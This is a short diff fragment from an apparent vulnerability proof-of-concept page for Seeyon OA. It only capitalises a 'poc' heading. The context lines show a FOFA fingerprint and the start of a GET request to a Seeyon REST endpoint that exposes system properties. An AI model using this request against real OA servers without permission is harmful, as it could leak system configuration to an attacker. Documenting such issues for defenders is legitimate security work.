@@ -10,7 +10,7 @@ app="致远互联-OA"
 
 
 
-## poc
+## POC
 
 ```
 GET /seeyon/rest/m3/common/system/properties HTTP/1.1
